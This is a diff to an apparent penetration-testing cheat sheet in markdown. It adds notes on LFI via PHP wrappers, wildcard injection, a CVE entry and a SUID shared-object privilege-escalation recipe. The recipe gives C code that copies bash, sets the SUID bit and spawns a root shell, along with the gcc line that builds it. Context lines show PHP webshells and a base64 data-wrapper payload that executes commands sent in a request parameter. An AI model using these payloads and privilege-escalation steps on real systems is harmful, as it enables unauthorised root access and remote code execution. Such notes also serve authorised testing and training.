@@ -97,6 +97,7 @@ POST request with json type
 
 ### Wordpress plugin scan
 	wpscan --url http://123.123.123.123
+Check wordpress and plugin versions for CVEs.  
 
 ### Webshells
 	<?php echo system("whoami"); ?>
@@ -110,6 +111,17 @@ data wrapper
 
 	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
 base64 encoded data wrapper  
+
+### LFI/PHP wrappers
+	http://url.com/index.php?file=
+On a php webserver with a valid URL parameter,  
+
+|Wrapper|Purpose|
+|---|---|
+|`php://filter/convert.base64-encode/resource=FILE`|Shows source code of FILE (extensions may be auto-attached depending on `index.php`)|
+|`zip:///pathtoZIP#filename`|Unzips and runs `filename.php`|
+[OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)  
+
 
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
@@ -492,8 +504,26 @@ Look for capabilities
 	'name:passhash:0:0::/root:'
 Generate passhash with `openssl passwd <password>`  
 
+## Linux - wildcards
+	/usr/bin/binary *.php
+Create a new file in the working directory to insert flags for malicious use. [hacktricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)  
+
 ## Linux - binaries
 	gtfobins.org
+
+## Linux - .so (shared object) injection
+	strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
+Check if SUID binary attempts to read .so file that can be injected  
+
+	#include <stdio.h>
+	#include <stdlib.h>
+	void inject(){
+    	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+	}
+Create a .c file  
+
+	gcc -shared -o <so filename> -fPIC <c filename>
+Compile the .so and inject it  
 
 ## Linux - history
 	history
@@ -718,6 +748,7 @@ GET/POST parameters
 |Flatpress|<1.3|CVE-2022-40048|[github issue](https://github.com/flatpressblog/flatpress/issues/152)||
 |JetBrains/TeamCity|<=2023.11.3|CVE-2024-27198|[rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)|Use curl command|
 |pdfkit|<=0.8.7.2|CVE-2022-25765|[exploitdb](https://www.exploit-db.com/exploits/51293)|Point to the POST endpoint|
+|wp-advanced-search|<3.3.9.2|CVE-2024-9796|[wpscan](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/)|Use PoC SQL injection|
 
 
 ## Run new shell
